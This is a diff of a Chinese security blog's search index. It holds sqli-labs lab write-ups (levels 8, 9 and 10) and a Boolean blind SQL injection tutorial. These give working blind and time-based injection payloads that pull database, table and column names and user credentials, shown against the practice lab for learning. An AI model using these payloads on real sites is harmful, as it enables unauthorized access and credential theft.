+</li>
+<li><p><strong>爆数据</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;and ord(substr((select username from users limit 0,1),1,1))&gt;67--+  返回正确</span><br><span class="line">?id=1&#x27;and ord(substr((select username from users limit 0,1),1,1))&gt;68--+  返回错误</span><br></pre></td></tr></table></figure>
+<p>说明第一个用户名是D，以此类推，可以得到所有用户名和密码。</p>
+</li>
+</ol>
+<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>手动进行布尔注入或时间注入很麻烦，我们只需要理解并记住其原理步骤即可</p>
+<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/FourthGuy/article/details/108984045">sqli-labs-master第八关</a></p>
 ]]></content>
       <categories>
         <category>SQL注入</category>
@@ -450,6 +494,99 @@ secure_file_priv 一栏的value为空，即是成功</li>
       <tags>
         <tag>SQL注入</tag>
         <tag>sqli-labs</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>sqli-labs_9+10</title>
+    <url>/2022/11/09/sqli-labs_9+10/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本次第九关既不能显示正确，也不会显示错误。因此不能使用布尔盲注，只能使用<a href="https://truthnian.github.io/2022/11/09/%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/">时间盲注</a>。</p>
+<span id="more"></span>
+
+<h1 id="解决步骤"><a href="#解决步骤" class="headerlink" title="解决步骤"></a>解决步骤</h1><ol>
+<li><p>判断是否存在<strong>SQL注入</strong>并判断注入类型<br>输入?id&#x3D;1  显示：You are in………..<br>输入?id&#x3D;1’ 显示：You are in………..<br>输入?id&#x3D;1” 显示：You are in………..<br>此时我们应该发现端倪，页面可能不会返回任何信息<br>输入?id&#x3D;1 and sleep(5)–+  页面迅速显示<br>输入?id&#x3D;1’and sleep(5)–+  页面延迟了5s，说明的确是应当使用时间盲注<br>输入?id&#x3D;1’’and sleep(5)–+  页面迅速显示<br>说明是单引号字符型注入</p>
+</li>
+<li><p>获取当前<strong>数据库名和数据库版本号</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;and if(length((select database()))&gt;7,sleep(5),1)--+    页面迅速显示</span><br><span class="line">?id=1&#x27;and if(length((select database()))&gt;8,sleep(5),1)--+    页面延迟了5s</span><br></pre></td></tr></table></figure>
+<p>说明数据库名长度是8个字符<br>版本号以此类推</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;and if(ascii(substr((select database()),1,1))&gt;115,sleep(5),1)--+   页面迅速显示</span><br><span class="line">?id=1&#x27;and if(ascii(substr((select database()),1,1))&gt;114,sleep(5),1)--+   页面延迟了5s</span><br></pre></td></tr></table></figure>
+<p>最终尝试完后可得数据库名是security</p>
+</li>
+<li><p><strong>爆表</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;and if(length((select group_concat(table_name) from information_schema.tables where table_schema=database()))&gt;13,sleep(5),1)--+</span><br><span class="line">如此判断所有表名长度</span><br><span class="line">?id=1&#x27;and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))&gt;99,sleep(5),1)--+</span><br><span class="line">再逐一判断表名</span><br></pre></td></tr></table></figure>
+<p>最终尝试完后可得所需表名为users</p>
+</li>
+<li><p><strong>爆字段名</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;and if(length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;))&gt;20,sleep(5),1)--+</span><br><span class="line">判断所有字段名的长度</span><br><span class="line">?id=1&#x27;and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;),1,1))&gt;99,sleep(5),1)--+</span><br><span class="line">逐一判断字段名</span><br></pre></td></tr></table></figure>
+<p>最终出现了我们所需的字段名username, password</p>
+</li>
+<li><p><strong>爆数据</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27; and if(length((select group_concat(username,password) from users))&gt;109,sleep(5),1)--+</span><br><span class="line">判断字段内容长度</span><br><span class="line">?id=1&#x27; and if(ascii(substr((select group_concat(username,password) from users),1,1))&gt;50,sleep(5),1)--+</span><br><span class="line">逐一检测内容</span><br></pre></td></tr></table></figure>
+<p>最终得到了所需的数据</p>
+</li>
+</ol>
+<h2 id="第9关和第10关思路相同，不同点是第9关的单引号在第10关换成了双引号"><a href="#第9关和第10关思路相同，不同点是第9关的单引号在第10关换成了双引号" class="headerlink" title="第9关和第10关思路相同，不同点是第9关的单引号在第10关换成了双引号"></a>第9关和第10关思路相同，不同点是第9关的单引号在第10关换成了双引号</h2><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>我终于知道为什么别人写博客，有些关会写得相当简略了，因为都是一样的，确实没意思…</p>
+<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><p><a href="https://blog.csdn.net/dreamthe/article/details/123795302">详细sqli-labs（1-65）通关讲解</a></p>
+]]></content>
+      <categories>
+        <category>SQL注入</category>
+        <category>sqli-labs</category>
+      </categories>
+      <tags>
+        <tag>SQL注入</tag>
+        <tag>sqli-labs</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>布尔盲注</title>
+    <url>/2022/11/08/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/</url>
+    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>基于布尔的盲注是一种常用的，重要的注入方式。</p>
+<span id="more"></span>
+
+<h1 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h1><p>当页面不返回查询信息的数据，只知道返回信息的对错（true or false）时即可用此方式。</p>
+<h1 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h1><h2 id="length-函数"><a href="#length-函数" class="headerlink" title="length()函数"></a>length()函数</h2><p>作用：返回字符串str的长度，以字节为单位。<br>示例：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;and length(database())&gt;=1--+		页面返回正常</span><br><span class="line">1&#x27;and length(database())&gt;=13--+		页面返回正常</span><br><span class="line">1&#x27;and length(database())&gt;=14--+		页面返回错误</span><br><span class="line"></span><br><span class="line">由此判断得到数据库名的长度是13个字符</span><br></pre></td></tr></table></figure>
+
+<h2 id="substr-函数"><a href="#substr-函数" class="headerlink" title="substr()函数"></a>substr()函数</h2><p>作用：从特定位置开始的字符串返回一个给定长度的子字符串<br>用法：<br>substr(str,pos,len)<br>str: 代表待截取的字符串<br>pos: 代表从什么位置开始截取<br>len: 表示字符串截取的长度<br>示例：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">and substr(database(),1,1)=&#x27;a&#x27;--+</span><br><span class="line">substr 的用法和 limit 有区别，limit从 0 开始排序，这里从 1 开始排序</span><br><span class="line">这里的字母不区分大小写</span><br></pre></td></tr></table></figure>
+<p>说明：与substr()函数作用相似的函数有mid()和substring()函数，其用法与substr()函数一致。<br>示例：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select substring(&#x27;hello&#x27;,1,1)和select mid(&#x27;hello&#x27;,1,1)</span><br><span class="line">都返回&#x27;h&#x27;</span><br></pre></td></tr></table></figure>
+
+<h2 id="ascii-函数"><a href="#ascii-函数" class="headerlink" title="ascii()函数"></a>ascii()函数</h2><p>作用：返回某个字符的ascii码值，ascii()函数只处理单个字符，若是字符串则会处理第一个字符。<br>示例：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ascii(&#x27;h&#x27;)=104 --+</span><br></pre></td></tr></table></figure>
+
+<h2 id="ord-函数"><a href="#ord-函数" class="headerlink" title="ord()函数"></a>ord()函数</h2><p>作用：通常与substr()函数一起使用，用于返回字符的ascii码。<br>示例：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">and ord(substr(database(),1,1))=97--+</span><br></pre></td></tr></table></figure>
+<p>说明：ASCII码表中可显示的字符范围是：0~127</p>
+<h1 id="过程步骤"><a href="#过程步骤" class="headerlink" title="过程步骤"></a>过程步骤</h1><ol>
+<li><p>判断数据库名长度</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;and length(database())&gt;=1--+		页面返回正常</span><br><span class="line">1&#x27;and length(database())&gt;=13--+		页面返回正常</span><br><span class="line">1&#x27;and length(database())&gt;=14--+		页面返回错误</span><br><span class="line"></span><br><span class="line">由此判断得到数据库名的长度是13个字符</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>猜解数据库名</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; and substr(database(),2,1)=&#x27;a&#x27;--+</span><br></pre></td></tr></table></figure>
+<p>或</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; and ord(substr(database(),1,1))=97--+</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>判断数据库表名</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; and substr((select table_name from information_schema.tables where table_schema=&#x27;数据库名&#x27; limit 0,1),1,1)=&#x27;a&#x27;--+</span><br><span class="line">--修改1,1前边的1~20，逐字符猜解出第一个表的名</span><br><span class="line">--修改limit的0,1前边的0~20，逐个猜解每个表</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>判断数据库字段名</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; and substr((select column_name from information_schema.columns where table_schema=&#x27;数据库名&#x27; and table_name=&#x27;表名&#x27; limit 0,1),1,1)=&#x27;a&#x27;--+</span><br><span class="line"></span><br><span class="line">--修改1,1前边的1~20，逐字符猜解出第一个字段的名</span><br><span class="line">--修改limit的0,1前边的0~20，逐个猜解每个字段</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>取数据</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; and substr((select 字段名 from 表名 limit 0,1),1,1)=&#x27;a&#x27;--+</span><br></pre></td></tr></table></figure></li>
+</ol>
+<p>说明：如果写脚本，采用二分法更佳</p>
+<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><ul>
+<li><a href="https://blog.csdn.net/qq_35569814/article/details/100175886">SQL注入之布尔盲注</a></li>
+<li><a href="https://wiki.wgpsec.org/knowledge/web/sql_injection.html">SQL注入漏洞基本原理</a></li>
+</ul>
+]]></content>
+      <categories>
+        <category>SQL注入</category>
+        <category>布尔盲注</category>
+      </categories>
+      <tags>
+        <tag>SQL注入</tag>
       </tags>
   </entry>
   <entry>
@@ -563,59 +700,6 @@ secure_file_priv 一栏的value为空，即是成功</li>
       <tags>
         <tag>动画</tag>
         <tag>资源</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>布尔盲注</title>
-    <url>/2022/11/08/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/</url>
-    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>基于布尔的盲注是一种常用的，重要的注入方式。</p>
-<span id="more"></span>
-
-<h1 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h1><p>当页面不返回查询信息的数据，只知道返回信息的对错（true or false）时即可用此方式。</p>
-<h1 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h1><h2 id="length-函数"><a href="#length-函数" class="headerlink" title="length()函数"></a>length()函数</h2><p>作用：返回字符串str的长度，以字节为单位。<br>示例：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;and length(database())&gt;=1--+		页面返回正常</span><br><span class="line">1&#x27;and length(database())&gt;=13--+		页面返回正常</span><br><span class="line">1&#x27;and length(database())&gt;=14--+		页面返回错误</span><br><span class="line"></span><br><span class="line">由此判断得到数据库名的长度是13个字符</span><br></pre></td></tr></table></figure>
-
-<h2 id="substr-函数"><a href="#substr-函数" class="headerlink" title="substr()函数"></a>substr()函数</h2><p>作用：从特定位置开始的字符串返回一个给定长度的子字符串<br>用法：<br>substr(str,pos,len)<br>str: 代表待截取的字符串<br>pos: 代表从什么位置开始截取<br>len: 表示字符串截取的长度<br>示例：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">and substr(database(),1,1)=&#x27;a&#x27;--+</span><br><span class="line">substr 的用法和 limit 有区别，limit从 0 开始排序，这里从 1 开始排序</span><br><span class="line">这里的字母不区分大小写</span><br></pre></td></tr></table></figure>
-<p>说明：与substr()函数作用相似的函数有mid()和substring()函数，其用法与substr()函数一致。<br>示例：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select substring(&#x27;hello&#x27;,1,1)和select mid(&#x27;hello&#x27;,1,1)</span><br><span class="line">都返回&#x27;h&#x27;</span><br></pre></td></tr></table></figure>
-
-<h2 id="ascii-函数"><a href="#ascii-函数" class="headerlink" title="ascii()函数"></a>ascii()函数</h2><p>作用：返回某个字符的ascii码值，ascii()函数只处理单个字符，若是字符串则会处理第一个字符。<br>示例：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ascii(&#x27;h&#x27;)=104 --+</span><br></pre></td></tr></table></figure>
-
-<h2 id="ord-函数"><a href="#ord-函数" class="headerlink" title="ord()函数"></a>ord()函数</h2><p>作用：通常与substr()函数一起使用，用于返回字符的ascii码。<br>示例：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">and ord(substr(database(),1,1))=97--+</span><br></pre></td></tr></table></figure>
-<p>说明：ASCII码表中可显示的字符范围是：0~127</p>
-<h1 id="过程步骤"><a href="#过程步骤" class="headerlink" title="过程步骤"></a>过程步骤</h1><ol>
-<li><p>判断数据库名长度</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;and length(database())&gt;=1--+		页面返回正常</span><br><span class="line">1&#x27;and length(database())&gt;=13--+		页面返回正常</span><br><span class="line">1&#x27;and length(database())&gt;=14--+		页面返回错误</span><br><span class="line"></span><br><span class="line">由此判断得到数据库名的长度是13个字符</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>猜解数据库名</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; and substr(database(),2,1)=&#x27;a&#x27;--+</span><br></pre></td></tr></table></figure>
-<p>或</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; and ord(substr(database(),1,1))=97--+</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>判断数据库表名</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; and substr((select table_name from information_schema.tables where table_schema=&#x27;数据库名&#x27; limit 0,1),1,1)=&#x27;a&#x27;--+</span><br><span class="line">--修改1,1前边的1~20，逐字符猜解出第一个表的名</span><br><span class="line">--修改limit的0,1前边的0~20，逐个猜解每个表</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>判断数据库字段名</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; and substr((select column_name from information_schema.columns where table_schema=&#x27;数据库名&#x27; and table_name=&#x27;表名&#x27; limit 0,1),1,1)=&#x27;a&#x27;--+</span><br><span class="line"></span><br><span class="line">--修改1,1前边的1~20，逐字符猜解出第一个字段的名</span><br><span class="line">--修改limit的0,1前边的0~20，逐个猜解每个字段</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>取数据</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; and substr((select 字段名 from 表名 limit 0,1),1,1)=&#x27;a&#x27;--+</span><br></pre></td></tr></table></figure></li>
-</ol>
-<p>说明：如果写脚本，采用二分法更佳</p>
-<h1 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h1><ul>
-<li><a href="https://blog.csdn.net/qq_35569814/article/details/100175886">SQL注入之布尔盲注</a></li>
-<li><a href="https://wiki.wgpsec.org/knowledge/web/sql_injection.html">SQL注入漏洞基本原理</a></li>
-</ul>
-]]></content>
-      <categories>
-        <category>SQL注入</category>
-        <category>布尔盲注</category>
-      </categories>
-      <tags>
-        <tag>SQL注入</tag>
       </tags>
   </entry>
   <entry>
